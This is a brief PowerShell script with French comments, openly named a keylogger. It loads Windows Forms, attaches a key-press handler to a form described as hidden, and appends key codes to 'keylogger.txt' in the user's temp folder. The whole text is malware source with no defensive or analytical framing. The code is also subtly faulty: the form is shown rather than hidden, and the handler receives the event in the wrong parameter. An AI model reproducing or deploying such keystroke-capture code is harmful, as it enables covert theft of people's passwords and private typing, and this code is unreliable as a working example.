# Obtenir le chemin du répertoire temporaire de l'utilisateur
$tempDir = [System.IO.Path]::GetTempPath()

# Créer le chemin d'accès complet du fichier de log dans le répertoire temporaire
$logfile = Join-Path -Path $tempDir -ChildPath "keylogger.txt"

# Charger l'assembly pour Windows Forms
Add-Type -AssemblyName System.Windows.Forms

# Fonction pour gérer les frappes de clavier
function KeyHandler {
    param ($sender, $e)
    Add-Content -Path $logfile -Value $e.KeyCode -Encoding ASCII -Force
}

# Créer une instance d'un formulaire caché pour capturer les frappes de clavier
$form = New-Object System.Windows.Forms.Form
$form.KeyPreview = $true
$form.Add_KeyDown({KeyHandler $_})
$form.ShowDialog() | Out-Null
